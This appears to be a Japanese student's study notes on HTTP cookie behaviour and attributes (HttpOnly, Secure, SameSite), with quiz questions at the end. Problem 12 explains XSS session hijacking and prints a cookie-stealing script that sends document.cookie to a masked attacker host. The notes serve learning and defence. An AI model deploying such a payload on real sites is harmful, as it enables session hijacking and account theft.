## 課題

### 問題1

- サーバがSet-Cookieという名前のフィールドをHTTPヘッダに載せてレスポンスを返し、Cookieとしてクライアントに保存して欲しい情報を、Set-Cookieフィールドの値として設定する。
- レスポンスを受け取ったクライアントはCookieをブラウザに保存する。それ以降のリクエストには受け取ったCookieをそのままリクエストするようになる。

参考出典

[https://qiita.com/uryyyyyyy/items/1c32afea4240a14d57e4](https://qiita.com/uryyyyyyy/items/1c32afea4240a14d57e4)

[https://developer.mozilla.org/ja/docs/Web/HTTP/Headers/Set-Cookie](https://developer.mozilla.org/ja/docs/Web/HTTP/Headers/Set-Cookie)

[https://www.infraexpert.com/study/tcpip16.6.html](https://www.infraexpert.com/study/tcpip16.6.html)

### 問題2

- 基本的にCookieはドメインが完全一致しないとデータを送信しない。
- 各クッキーはこのクッキーはどのドメイン名用のものかという情報が紐づけられている
- HTML、画像、CSS、JavaScript、Ajaxなどサーバーからブラウザに送られたリソースに紐づけてクッキーは扱われている。
- どこから来たのか情報をオリジンという。元のドメイン名に所属しないクッキーは認められない（クロスオリジンは認められない）

参考出典

[https://developer.mozilla.org/ja/docs/Web/Security/Same-origin_policy](https://developer.mozilla.org/ja/docs/Web/Security/Same-origin_policy)

### 問題3

- RFC6265の前書きに書いてある内容は特定のホストのCookieはそのホストの全てのポートで共有されるとしている

```
同様に、Webブラウザーで使用される通常の「同じ起源ポリシー」は異なるポートを介して取得されたコンテンツを分離しますが、特定のホストのCookieはそのホストのすべてのポートで共有されます。
```

参考出典

[https://datatracker.ietf.org/doc/html/rfc6265](https://datatracker.ietf.org/doc/html/rfc6265)

### 問題4

- ホスト名が異なると送信されない（クロスオリジンになるから）

参考出典

[https://developer.mozilla.org/ja/docs/Web/Security/Same-origin_policy](https://developer.mozilla.org/ja/docs/Web/Security/Same-origin_policy)

### 問題5

- Domainを指定した場合には送信される。デフォルトの状態ではクッキーをセットしたサーバーのみに送信されるが、 Domain属性を指定した場合に複数のドメイン（サブドメイン）から成り立つサービス間で使える(サブドメインはhoge.comeの前のapiの部分でサブドメインは一つのドメインを用途に複数に分割できる）

例: [api.hoge.com](http://api.hoge.com) ○

      [piyo.hoge.com](http://piyo.hoge.com) ○

      [piyo.hoge.jp](http://piyo.hoge.jp) ✖︎    

参考出典

[https://developer.mozilla.org/ja/docs/Web/HTTP/Cookies](https://developer.mozilla.org/ja/docs/Web/HTTP/Cookies)

[https://blog.tokumaru.org/2011/10/cookiedomain.html](https://blog.tokumaru.org/2011/10/cookiedomain.html)

[https://mytracking.hatenablog.com/entry/2016/10/09/081251](https://mytracking.hatenablog.com/entry/2016/10/09/081251)

[https://www.kanzennirikaisita.com/posts/cookie-domain-same-site-difference](https://www.kanzennirikaisita.com/posts/cookie-domain-same-site-difference)

### 問題6

### HttpOnly属性

- Set-Cookieの際にHttpOnly属性をつけることによってCookieはJavascriptから参照・更新はできなくなる
- 例:Set-Cookie: secretname=hogehoge; HttpOnly
- HttpOnly属性はクロスサイトスクリプティング（XSS）の緩和策として導入
- HttpOnly属性をつけてもinnerHTMLは取得できる
- XMLHttpRequest等で別ページの機密情報を取得できる
- DoM操作、XMLHttpRequestはJavaScriptからできるため、秘密情報の盗み出し屋、なりすましはCookieにHttpOnly属性がついていても可能
- XSSによるJavaScript実行は、ウェブアプリケーションに元々あるJavascriptと区別がつかないので、クッキーの属性により攻撃を防止することはできない
- CookieのHttpOnly属性は「Cookieを盗み出す」という攻撃はできなくなるが、他の攻撃はできるため、XSSによる影響はあまり軽減できない

参考出典

[https://developer.mozilla.org/ja/docs/Web/HTTP/Cookies](https://developer.mozilla.org/ja/docs/Web/HTTP/Cookies)

[https://www.youtube.com/channel/UCLNW6Bo_YU3TxnzsII2gEDA](https://www.youtube.com/channel/UCLNW6Bo_YU3TxnzsII2gEDA)

### 問題7

### Secure属性

- Set-Cookieの際にSecure属性をつけることができる
- 例: Set-Cookie: sessid=11111111; Path=/; Secure
- Secure属性のついたCookieはHTTPSの場合のみ送信される
- Secure属性のついていないCookieはHTTPでも送信されるため、HTTPリクエストの際に盗聴される可能性がある

参考出典

[https://www.notion.so/ac13bbf2e43e4f258678e88327064eee](https://www.notion.so/ac13bbf2e43e4f258678e88327064eee)

[https://www.youtube.com/channel/UCLNW6Bo_YU3TxnzsII2gEDA](https://www.youtube.com/channel/UCLNW6Bo_YU3TxnzsII2gEDA)

### 問題8

- Expiresを設定すると有効期限を日時で設定することができ
Thu, 1-Jan-2030 00:00:00 GMT
の形式で指定する。時間は必ずGMT（グリニッジ標準時間）を指定する

### 問題9

- Cookieに指定可能な新しい属性。Strict、Lax、Noneの3つの属性を指定できる
- None属性はこれまでのCookieの挙動通り、全てのリクエストに対してCookieが付与される
- Strict属性はsame-siteに対するリクエストにのみCookieが付与される。Cookieを使いログイン認証をしているサイトに対してcross-siteなサイトに設置されたリンクから遷移した場合、リクエストにCookieが付与されないため末ログイン状態になる。
- Lax属性はNoneとStrictの間くらいで、ブラウザがアクセスしているサイトと同じドメインのCookie、すなわちファーストパーティCookieしかデフォルトで設定されない。(1st Party Cookieとはユーザーが訪問しているウェブサイトのドメインから直接発行されているCookie)

出典

[https://developers-jp.googleblog.com/2020/12/chrome-same-site.html](https://developers-jp.googleblog.com/2020/12/chrome-same-site.html)

[https://developer.mozilla.org/ja/docs/Web/HTTP/Headers/Set-Cookie/SameSite](https://developer.mozilla.org/ja/docs/Web/HTTP/Headers/Set-Cookie/SameSite)

### 問題10

個人が特定できてしまう情報、クレジットカード情報、パスワード情報

[https://www.businesslawyers.jp/articles/693](https://www.businesslawyers.jp/articles/693)

[https://time-space.kddi.com/ict-keywords/20180726/2392](https://time-space.kddi.com/ict-keywords/20180726/2392)

### 問題11

最初に二つの共通点としては

- クライアントから参照をすることができる。
- 保存するデータをKey-Valueで保存する

異なる点は

- 大きなデータ量を簡単に取り扱うことができる
- Cookieは通信ごとに毎回勝手に送信される

Cookie

- クライアント、サーバーサイドで使用する
- 任意に有効期限を決められる
- 保存容量が最大4KB
- つまりサーバーで参照する必要がある場合はCookieを使う

LocalStorage

- クライアントサイドで使用する
- サーバーへデータを送信しないため、通信の影響がない
- 無期限にデータを保存
- 保存容量はブラウザにより異なるが(5MB~10MB)
- サーバーで参照する必要がない場合はLocalStorageを使う

出典

[https://toukei-lab.com/localstrage](https://toukei-lab.com/localstrage)

[https://developer.mozilla.org/ja/docs/Web/API/Web_Storage_API](https://developer.mozilla.org/ja/docs/Web/API/Web_Storage_API)

[https://qiita.com/terufumi1122/items/76bafb9eed7cfc77b798](https://qiita.com/terufumi1122/items/76bafb9eed7cfc77b798)

### 問題12

### 仕組み

まずXSSと他人のWEBサイトへ悪意のあるスクリプトを埋め込むことで、cookie情報を第三者に抜き取られてしまったら抜き取られた人のアカウントで不正にログインすることができる。このことをセッションハイジャックという

<script type=”text/javascript” >

document.location=”http://●●●●●.com/script.cgi?cookie=”+document.cookie;

</script>

クッキー情報（document.cookie）を、攻撃者のサイト（http://●●●●●.com/）のクッキー情報を抜き取るプログラムへ送っている。

攻撃者は、被害者のCookie情報をもとに不正ログインし、個人情報（クレジットカード情報等も）見ることができる

### 対策

XSSは＜と＞などの文字を、特殊文字として認識するブラウザの仕様を利用した攻撃手法になる。

例えば、<script type=”text/javascript” >はブラウザはスクリプトとして認識してしまう。<>などの特殊文字を、削除（または別の文字へ置換）すればスクリプトではなくただの文字列として認識する。

そのためXSS対策として有効なのは<>などの文字を、特殊文字（タグ）として認識させないようにする。

# 課題２（クイズ）

### クイズ1

- Chrome79とChrome80の場合にSameSiteの挙動はどう異なるのか説明せよ

### クイズ2と3

- インターネット通販A社のサイトで脆弱性検査を実施したところ、指摘事項2点が報告された
- 指摘事項A：画面の遷移の中で、暗号化通信と非暗号化通信が混在しているが、暗号化通信でだけ使用されるべきクッキーに(a)属性が設定されていないページが存在する。
- 指摘事項B：任意のスクリプトが実行可能であるページが存在する

![https://s3-us-west-2.amazonaws.com/secure.notion-static.com/8ac26390-a207-4204-8b3e-98b6d99c1afa/Untitled.png](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/8ac26390-a207-4204-8b3e-98b6d99c1afa/Untitled.png)

aに当てはまる文字を入れよ。

指摘事項Bは何の脆弱性か答えよ